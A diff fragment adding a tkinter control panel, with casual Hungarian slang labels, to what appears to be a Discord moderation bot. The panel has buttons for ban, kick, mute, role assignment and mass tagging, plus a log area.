+lbl(s2, "mennyi masodperc a mute xd").pack(anchor="w", pady=(0,4))
+mins_frame, mins_entry = raw_inp(s2, 12)
+mins_entry.insert(0, "60")
+mins_frame.pack(anchor="w")
+
+s3 = section(inner_frame, "melyik akarod csinalni teso")
+
+row0 = tk.Frame(s3, bg=BG2)
+row0.pack(fill="x", pady=(0,6))
+btn_red  (row0, "mehet a ban teso xd",       btn_ban   ).pack(side="left", padx=(0,6))
+btn_green(row0, "kit akarsz unbannolni xd",  btn_unban ).pack(side="left", padx=(0,6))
+btn_yellow(row0, "kick mehet",               btn_kick  ).pack(side="left")
+
+row1 = tk.Frame(s3, bg=BG2)
+row1.pack(fill="x")
+btn_yellow(row1, "muteoljuk ezt a kocsogot?", btn_mute  ).pack(side="left", padx=(0,6))
+btn_green (row1, "un mutoljuk xd?",           btn_unmute).pack(side="left")
+
+s4 = section(inner_frame, "rang ize")
+lbl(s4, "rol id?").pack(anchor="w", pady=(0,4))
+role_frame, role_entry = raw_inp(s4, 30)
+role_frame.pack(anchor="w", pady=(0,10))
+
+row2 = tk.Frame(s4, bg=BG2)
+row2.pack(fill="x")
+btn(row2, "mehet a role nekiXD",  btn_giverole).pack(side="left", padx=(0,6))
+btn(row2, "mehet mindenkinek xd", btn_roleall ).pack(side="left")
+
+s5 = section(inner_frame, "minendik tagelni es jah")
+lbl(s5, "tagg message mehet?").pack(anchor="w", pady=(0,4))
+tag_frame, tagmsg_entry = raw_inp(s5, 38)
+tag_frame.pack(anchor="w", pady=(0,10))
+btn_red(s5, "mindenit?", btn_tagall).pack(anchor="w")
+
+log_card = tk.Frame(inner_frame, bg=BG2, highlightthickness=1, highlightbackground=BORDER)
+log_card.pack(fill="x", padx=16, pady=(0,16))
+tk.Label(log_card, text="LOG", bg=BG2, fg=FG2, font=F_CAPS).pack(anchor="w", padx=14, pady=(10,6))
+tk.Frame(log_card, bg=BORDER, height=1).pack(fill="x", padx=14)
+output = tk.Text(log_card, bg=ENTRY_BG, fg=FG, font=F_MONO,
+                 height=7, state="disabled", relief="flat", bd=8,
+                 highlightthickness=0)
+output.pack(fill="x", padx=14, pady=(6,14))
+output.tag_config("green", foreground=GREEN)
+output.tag_config("red",   foreground=RED)
+output.tag_config("white", foreground=FG)
+
+threading.Thread(target=start_bot, daemon=True).start()
+root.mainloop()
